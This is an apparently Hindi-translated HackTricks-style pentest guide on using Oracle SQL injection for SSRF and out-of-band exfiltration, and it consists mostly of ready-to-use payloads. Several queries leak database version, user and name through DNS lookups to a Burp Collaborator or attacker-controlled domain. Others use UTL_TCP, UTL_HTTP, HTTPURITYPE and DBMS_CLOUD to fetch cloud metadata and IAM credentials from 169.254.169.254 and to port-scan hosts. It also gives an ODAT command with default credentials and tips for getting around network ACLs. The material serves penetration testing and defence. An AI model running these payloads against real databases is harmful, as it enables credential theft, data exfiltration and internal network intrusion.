# Oracle injection

{{#include ../../banners/hacktricks-training.md}}

**इस पोस्ट को [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) से हटाए गए पोस्ट की वेबबैक मशीन कॉपी सर्व करें।**

## SSRF

Oracle का उपयोग Out of Band HTTP और DNS अनुरोध करने के लिए अच्छी तरह से प्रलेखित है, लेकिन SQL डेटा को एक्सफिल्ट्रेट करने के लिए इंजेक्शनों में। हम हमेशा इन तकनीकों/फंक्शंस को अन्य SSRF/XSPA करने के लिए संशोधित कर सकते हैं।

Oracle स्थापित करना वास्तव में दर्दनाक हो सकता है, खासकर यदि आप कमांड आजमाने के लिए एक त्वरित इंस्टेंस सेट करना चाहते हैं। मेरे दोस्त और सहयोगी [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), ने मुझे [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) की ओर इशारा किया, जिसने मुझे एक t2.large AWS Ubuntu मशीन और Docker पर एक इंस्टेंस सेटअप करने की अनुमति दी।

मैंने `--network="host"` फ्लैग के साथ docker कमांड चलाया ताकि मैं इस ब्लॉगपोस्ट के दौरान Oracle को एक मूल इंस्टॉल के रूप में पूर्ण नेटवर्क एक्सेस के साथ अनुकरण कर सकूं।
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Oracle packages that support a URL or a Hostname/Port Number specification <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

किसी भी पैकेज और फ़ंक्शंस को खोजने के लिए जो एक होस्ट और पोर्ट स्पेसिफिकेशन का समर्थन करते हैं, मैंने [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html) पर एक Google खोज की। विशेष रूप से,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
खोज ने निम्नलिखित परिणाम लौटाए (सभी का उपयोग आउटबाउंड नेटवर्क करने के लिए नहीं किया जा सकता)

- DBMS_NETWORK_ACL_ADMIN
- UTL_SMTP
- DBMS_XDB
- DBMS_SCHEDULER
- DBMS_XDB_CONFIG
- DBMS_AQ
- UTL_MAIL
- DBMS_AQELM
- DBMS_NETWORK_ACL_UTILITY
- DBMS_MGD_ID_UTL
- UTL_TCP
- DBMS_MGWADM
- DBMS_STREAMS_ADM
- UTL_HTTP

यह कच्ची खोज स्पष्ट रूप से ऐसे पैकेजों को छोड़ देती है जैसे `DBMS_LDAP` (जो एक होस्टनाम और पोर्ट नंबर पास करने की अनुमति देता है) क्योंकि [डॉक्यूमेंटेशन पृष्ठ](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360) आपको बस [एक अलग स्थान](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360) पर ले जाता है। इसलिए, अन्य Oracle पैकेज हो सकते हैं जिन्हें आउटबाउंड अनुरोध करने के लिए दुरुपयोग किया जा सकता है जिन्हें मैंने छोड़ दिया हो सकता है।

किसी भी मामले में, आइए हम कुछ पैकेजों पर नज़र डालते हैं जिन्हें हमने खोजा और ऊपर सूचीबद्ध किया है।

**DBMS_LDAP.INIT**

`DBMS_LDAP` पैकेज LDAP सर्वरों से डेटा तक पहुँचने की अनुमति देता है। `init()` फ़ंक्शन एक LDAP सर्वर के साथ एक सत्र प्रारंभ करता है और एक होस्टनाम और पोर्ट नंबर को तर्क के रूप में लेता है।

इस फ़ंक्शन को पहले DNS के माध्यम से डेटा के निष्कर्षण को दिखाने के लिए दस्तावेज़ित किया गया है, जैसे नीचे
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
हालांकि, यह देखते हुए कि यह फ़ंक्शन एक होस्टनाम और एक पोर्ट नंबर को तर्क के रूप में स्वीकार करता है, आप इसका उपयोग पोर्ट स्कैनर की तरह भी कर सकते हैं।

यहाँ कुछ उदाहरण हैं
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` यह दिखाता है कि पोर्ट बंद है जबकि एक सत्र मान पोर्ट को खुला दिखाता है।

**UTL_SMTP**

`UTL_SMTP` पैकेज SMTP के माध्यम से ई-मेल भेजने के लिए डिज़ाइन किया गया है। [Oracle दस्तावेज़ साइट पर दिया गया उदाहरण दिखाता है कि आप इस पैकेज का उपयोग करके ई-मेल कैसे भेज सकते हैं](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478)। हमारे लिए, हालांकि, दिलचस्प बात यह है कि एक होस्ट और पोर्ट विनिर्देशन प्रदान करने की क्षमता है।

नीचे एक कच्चा उदाहरण दिया गया है जिसमें `UTL_SMTP.OPEN_CONNECTION` फ़ंक्शन है, जिसमें 2 सेकंड का टाइमआउट है।
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout` यह दर्शाता है कि पोर्ट खुला है लेकिन कोई SMTP कनेक्शन स्थापित नहीं हुआ, जबकि `ORA-29278: SMTP transient error: 421 Service not available` यह दर्शाता है कि पोर्ट बंद है।

**UTL_TCP**

`UTL_TCP` पैकेज और इसके प्रक्रियाएँ और फ़ंक्शन [सेवाओं के साथ TCP/IP आधारित संचार की अनुमति देते हैं](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)। यदि किसी विशेष सेवा के लिए प्रोग्राम किया गया है, तो यह पैकेज नेटवर्क में प्रवेश करने का एक तरीका बन सकता है या पूर्ण सर्वर साइड अनुरोध कर सकता है क्योंकि TCP/IP कनेक्शन के सभी पहलुओं को नियंत्रित किया जा सकता है।

उदाहरण [Oracle दस्तावेज़ साइट पर दिखाता है कि आप इस पैकेज का उपयोग करके एक कच्चा TCP कनेक्शन कैसे बना सकते हैं ताकि एक वेब पृष्ठ को प्राप्त किया जा सके](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)। हम इसे थोड़ा और सरल बना सकते हैं और इसका उपयोग मेटाडेटा उदाहरण के लिए या किसी मनमाने TCP/IP सेवा के लिए अनुरोध करने के लिए कर सकते हैं।
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
दिलचस्प बात यह है कि कच्चे TCP अनुरोध बनाने की क्षमता के कारण, इस पैकेज का उपयोग सभी क्लाउड प्रदाताओं के Instance मेटा-डेटा सेवा को क्वेरी करने के लिए भी किया जा सकता है क्योंकि विधि प्रकार और अतिरिक्त हेडर सभी TCP अनुरोध के भीतर पास किए जा सकते हैं।

**UTL_HTTP और वेब अनुरोध**

शायद हर Out of Band Oracle SQL Injection ट्यूटोरियल में सबसे सामान्य और व्यापक रूप से प्रलेखित तकनीक [`UTL_HTTP` पैकेज](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070) है। इस पैकेज को प्रलेखन द्वारा इस प्रकार परिभाषित किया गया है - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
आप इसे कुछ मौलिक पोर्ट स्कैनिंग करने के लिए भी उपयोग कर सकते हैं, जैसे कि प्रश्नों के साथ
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` या `TNS:operation timed out` यह संकेत है कि TCP पोर्ट बंद है, जबकि `ORA-29263: HTTP protocol error` या डेटा यह संकेत है कि पोर्ट खुला है।

एक और पैकेज जिसका मैंने अतीत में विभिन्न सफलताओं के साथ उपयोग किया है, वह है [`GETCLOB()` विधि `HTTPURITYPE` Oracle अमूर्त प्रकार की](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) जो आपको एक URL के साथ इंटरैक्ट करने की अनुमति देती है और HTTP प्रोटोकॉल के लिए समर्थन प्रदान करती है। `GETCLOB()` विधि का उपयोग एक URL से GET प्रतिक्रिया को [CLOB डेटा प्रकार](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) के रूप में लाने के लिए किया जाता है।
```
SELECT HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() FROM dual;
```
---

## अतिरिक्त पैकेज और तकनीकें (Oracle 19c → 23c)

### UTL_INADDR – DNS-आधारित डेटा निकासी और होस्ट खोज

`UTL_INADDR` सरल नाम-समाधान सहायक प्रदान करता है जो डेटाबेस होस्ट से एक आउटबाउंड DNS लुकअप को ट्रिगर करता है। क्योंकि केवल एक डोमेन की आवश्यकता होती है (कोई पोर्ट/ACL की आवश्यकता नहीं) यह तब भी विश्वसनीय प्राइमिटिव है जब अन्य नेटवर्क कॉलआउट्स को ब्लॉक किया गया हो।
```sql
-- Leak the DB name and current user via a DNS query handled by Burp Collaborator
SELECT UTL_INADDR.get_host_address(
(SELECT name FROM v$database)||'.'||(SELECT user FROM dual)||
'.attacker.oob.server') FROM dual;
```
`get_host_address()` IP को हल करता है (या यदि हल करने में विफल रहता है तो `ORA-29257` उठाता है)। हमलावर को कोड निष्पादन की पुष्टि करने के लिए नियंत्रित डोमेन पर आने वाले DNS अनुरोध को देखना होता है।

### DBMS_CLOUD.SEND_REQUEST – Autonomous/23c पर पूर्ण HTTP क्लाइंट

हाल के क्लाउड-केंद्रित संस्करण (Autonomous Database, 21c/23c, 23ai) के साथ `DBMS_CLOUD` आता है। `SEND_REQUEST` फ़ंक्शन एक सामान्य उद्देश्य HTTP क्लाइंट के रूप में कार्य करता है जो कस्टम क्रियाओं, हेडर, TLS और बड़े बॉडीज़ का समर्थन करता है, जिससे यह पारंपरिक `UTL_HTTP` की तुलना में कहीं अधिक शक्तिशाली बन जाता है।
```sql
-- Assuming the current user has CREATE CREDENTIAL and network ACL privileges
BEGIN
-- empty credential when no auth is required
DBMS_CLOUD.create_credential(
credential_name => 'NOAUTH',
username        => 'ignored',
password        => 'ignored');
END;
/

DECLARE
resp  DBMS_CLOUD_TYPES.resp;
BEGIN
resp := DBMS_CLOUD.send_request(
credential_name => 'NOAUTH',
uri             => 'http://169.254.169.254/latest/meta-data/',
method          => 'GET',
timeout         => 3);
dbms_output.put_line(DBMS_CLOUD.get_response_text(resp));
END;
/
```
क्योंकि `SEND_REQUEST` मनमाने लक्ष्य URIs की अनुमति देता है, इसे SQLi के माध्यम से दुरुपयोग किया जा सकता है:
1. आंतरिक पोर्ट स्कैनिंग / SSRF क्लाउड मेटाडेटा सेवाओं के लिए।
2. HTTPS के माध्यम से आउट-ऑफ-बैंड एक्सफिल्ट्रेशन (Burp Collaborator या `ngrok` टनल का उपयोग करें)।
3. हमलावर सर्वरों के लिए कॉलबैक, भले ही पुराने कॉलआउट पैकेज ACLs द्वारा अक्षम हों।

ℹ️ यदि आपके पास केवल एक क्लासिकल ऑन-प्रेम 19c है लेकिन आप Java स्टोर प्रक्रियाएँ बना सकते हैं, तो आप कभी-कभी OCI क्लाइंट बंडल से `DBMS_CLOUD` स्थापित कर सकते हैं — कुछ एंगेजमेंट्स में उपयोगी।

### **ODAT** के साथ हमले की सतह को स्वचालित करना

[ODAT – Oracle Database Attacking Tool](https://github.com/quentinhardy/odat) ने आधुनिक रिलीज़ के साथ तालमेल बनाए रखा है (19c, 5.1.1 – अप्रैल-2022 तक परीक्षण किया गया)। `–utl_http`, `–utl_tcp`, `–httpuritype` और नए `–dbms_cloud` मॉड्यूल स्वचालित रूप से:
* उपयोगी कॉलआउट पैकेज/ACL ग्रांट का पता लगाते हैं।
* अंधे निष्कर्षण के लिए DNS और HTTP कॉलबैक को ट्रिगर करते हैं।
* Burp/SQLMap के लिए कॉपी करने के लिए तैयार SQL पेलोड उत्पन्न करते हैं।

उदाहरण: डिफ़ॉल्ट क्रेडेंशियल्स के साथ त्वरित OOB जांच (पृष्ठभूमि में ACL एन्यूमरेशन का ध्यान रखता है):
```bash
odat all -s 10.10.10.5 -p 1521 -d XE -U SCOTT -P tiger --modules oob
```
### हाल की नेटवर्क ACL प्रतिबंध और बायपास

Oracle ने जुलाई 2023 CPU में डिफ़ॉल्ट नेटवर्क ACLs को कड़ा किया — अब अप्रिविलेज्ड खाते डिफ़ॉल्ट रूप से `ORA-24247: network access denied by access control list` प्राप्त करते हैं। दो पैटर्न अभी भी SQLi के माध्यम से कॉलआउट की अनुमति देते हैं:
1. लक्षित खाता एक ACL प्रविष्टि का मालिक है (`DBMS_NETWORK_ACL_ADMIN.create_acl`) जिसे एक डेवलपर ने एकीकरण के लिए जोड़ा था।
2. हमलावर एक उच्च-प्रिविलेज PL/SQL डिफाइनर-राइट्स रूटीन का दुरुपयोग करता है (जैसे कि एक कस्टम एप्लिकेशन में) जो *पहले से ही* `AUTHID DEFINER` और आवश्यक ग्रांट्स रखता है।

यदि आप शोषण के दौरान `ORA-24247` का सामना करते हैं, तो हमेशा पुन: प्रयोज्य प्रक्रियाओं की खोज करें:
```sql
SELECT owner, object_name
FROM   dba_objects
WHERE  object_type = 'PROCEDURE'
AND  authid       = 'DEFINER';
```
(कई ऑडिट में कम से कम एक रिपोर्टिंग/निर्यात प्रक्रिया के पास आवश्यक अधिकार थे)।

---

## संदर्भ

* Oracle Docs – `DBMS_CLOUD.SEND_REQUEST` पैकेज का विवरण और उदाहरण।
* quentinhardy/odat – Oracle Database अटैकिंग टूल (नवीनतम रिलीज 5.1.1, अप्रैल-2022)।

{{#include ../../banners/hacktricks-training.md}}
